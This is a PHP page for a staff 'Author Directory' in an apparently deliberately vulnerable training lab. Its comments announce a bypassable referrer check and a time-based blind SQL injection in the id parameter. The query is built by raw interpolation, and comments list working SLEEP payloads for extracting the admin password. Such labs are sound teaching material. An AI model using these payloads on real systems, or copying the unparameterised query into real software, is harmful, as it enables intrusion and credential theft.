<?php
// ============================================================
// Author Directory — OutForm Portal
// VULN 1: Referrer-based access control (bypassable)
// VULN 2: Time-based blind SQL injection in ?id= parameter
//         Single-row integer lookup — SLEEP executes exactly once
// ============================================================

// VULN 1: Referrer check — must come from news.php specifically
// The required referrer is NOT shown on the page but leaks in browser console.log
require_once '../includes/referrer_check.php';
require_referrer('news.php');

$page_title = "Author Directory — OutForm Portal";
include '../includes/header.php';
require_once '../config/db.php';

// ----------------------------------------------------------------
// VULN 2: Time-based blind SQL injection via ?id=
//
// The id parameter is interpolated directly into an integer comparison
// with NO sanitisation. Because this is a single-row lookup, SLEEP()
// fires exactly once — giving a clean, reliable 5-second delay.
//
// Payloads:
//   ?id=1 AND SLEEP(5)-- -
//   ?id=1 AND IF(1=1,SLEEP(5),0)-- -
//   ?id=1 AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='C',SLEEP(5),0)-- -
//
// Because the query hits one row, each SLEEP runs once — not per-row.
// Enumerate DB version:  ?id=1 AND IF(MID(@@version,1,1)='5',SLEEP(5),0)-- -
// Enumerate admin pass:  ?id=1 AND IF(MID((SELECT password FROM users WHERE username='admin'),1,1)='C',SLEEP(5),0)-- -
// ----------------------------------------------------------------
$id     = $_GET['id']   ?? null;
$search = $_GET['q']    ?? '';
$dept_filter = $_GET['dept'] ?? '';

$profile = null;

if ($id !== null) {
    // VULN: raw integer interpolation — no cast, no prepared statement
    $sql_profile = "SELECT * FROM staff WHERE id = $id";
    $res = $conn->query($sql_profile);
    $profile = ($res && $res->num_rows > 0) ? $res->fetch_assoc() : false;
}

// Directory listing query (dept filter is safely escaped)
$sql = "SELECT * FROM staff WHERE 1=1";
if ($search !== '') {
    $sql .= " AND (name LIKE '%" . $conn->real_escape_string($search) . "%'"
          . " OR department LIKE '%" . $conn->real_escape_string($search) . "%'"
          . " OR position LIKE '%" . $conn->real_escape_string($search) . "%')";
}
if ($dept_filter !== '') {
    $sql .= " AND department = '" . $conn->real_escape_string($dept_filter) . "'";
}
$sql .= " ORDER BY department, name";

$result = $conn->query($sql);
$staff  = $result ? $result->fetch_all(MYSQLI_ASSOC) : [];

// Departments for filter dropdown
$depts_res = $conn->query("SELECT DISTINCT department FROM staff ORDER BY department");
$departments = $depts_res ? array_column($depts_res->fetch_all(MYSQLI_ASSOC), 'department') : [];
?>

<h4 class="section-title">👥 Author Directory</h4>

<?php if ($id !== null): ?>
    <?php if ($profile): ?>
    <!-- Single profile view — the ?id= injection point -->
    <div class="card mb-4" style="border-top: 4px solid #f26522;">
        <div class="card-header bg-white d-flex justify-content-between align-items-center">
            <strong><?= htmlspecialchars($profile['name']) ?></strong>
            <span class="badge badge-secondary"><?= htmlspecialchars($profile['department']) ?></span>
        </div>
        <div class="card-body">
            <dl class="row mb-0">
                <dt class="col-sm-3">Position</dt>
                <dd class="col-sm-9"><?= htmlspecialchars($profile['position']) ?></dd>

                <dt class="col-sm-3">Email</dt>
                <dd class="col-sm-9">
                    <a href="mailto:<?= htmlspecialchars($profile['email']) ?>">
                        <?= htmlspecialchars($profile['email']) ?>
                    </a>
                </dd>

                <dt class="col-sm-3">Phone</dt>
                <dd class="col-sm-9"><?= htmlspecialchars($profile['phone']) ?></dd>

                <dt class="col-sm-3">Extension</dt>
                <dd class="col-sm-9"><?= htmlspecialchars($profile['ext']) ?></dd>
            </dl>
        </div>
        <div class="card-footer bg-white">
            <a href="index.php" class="btn btn-sm btn-outline-secondary">&larr; All Authors</a>
        </div>
    </div>
    <?php else: ?>
    <div class="alert alert-warning">No author found with that ID.</div>
    <a href="index.php" class="btn btn-sm btn-outline-secondary mb-4">&larr; All Authors</a>
    <?php endif; ?>

<?php else: ?>

<p class="text-muted mb-4">Search for letter authors by name, department or role.</p>

<form method="GET" action="" class="mb-4">
    <div class="form-row align-items-end">
        <div class="col-md-5">
            <label for="q" class="sr-only">Search</label>
            <input type="text"
                   id="q"
                   name="q"
                   class="form-control"
                   placeholder="Search by name, department or title..."
                   value="<?= htmlspecialchars($search) ?>">
        </div>
        <div class="col-md-3">
            <select name="dept" class="form-control">
                <option value="">All Departments</option>
                <?php foreach ($departments as $d): ?>
                    <option value="<?= htmlspecialchars($d) ?>" <?= $dept_filter === $d ? 'selected' : '' ?>>
                        <?= htmlspecialchars($d) ?>
                    </option>
                <?php endforeach; ?>
            </select>
        </div>
        <div class="col-md-2">
            <button type="submit" class="btn btn-primary btn-block">Search</button>
        </div>
        <?php if ($search || $dept_filter): ?>
        <div class="col-md-2">
            <a href="index.php" class="btn btn-outline-secondary btn-block">Clear</a>
        </div>
        <?php endif; ?>
    </div>
</form>

<?php if ($search !== ''): ?>
    <p class="text-muted small mb-3">
        <?= count($staff) ?> result(s) for <em>"<?= htmlspecialchars($search) ?>"</em>
    </p>
<?php endif; ?>

<?php if (empty($staff)): ?>
    <div class="alert alert-info">No authors found matching your search.</div>
<?php else: ?>
<div class="table-responsive">
    <table class="table table-hover table-bordered bg-white">
        <thead class="thead-light">
            <tr>
                <th>Name</th>
                <th>Department</th>
                <th>Position</th>
                <th>Email</th>
                <th>Phone</th>
                <th>Ext.</th>
                <th></th>
            </tr>
        </thead>
        <tbody>
        <?php foreach ($staff as $row): ?>
            <tr>
                <td><?= htmlspecialchars($row['name']) ?></td>
                <td><span class="badge badge-secondary"><?= htmlspecialchars($row['department']) ?></span></td>
                <td><?= htmlspecialchars($row['position']) ?></td>
                <td><a href="mailto:<?= htmlspecialchars($row['email']) ?>"><?= htmlspecialchars($row['email']) ?></a></td>
                <td><?= htmlspecialchars($row['phone']) ?></td>
                <td><?= htmlspecialchars($row['ext']) ?></td>
                <td>
                    <a href="index.php?id=<?= (int)$row['id'] ?>"
                       class="btn btn-sm btn-outline-primary">View</a>
                </td>
            </tr>
        <?php endforeach; ?>
        </tbody>
    </table>
</div>
<?php endif; ?>

<?php endif; ?>

<?php include '../includes/footer.php'; ?>
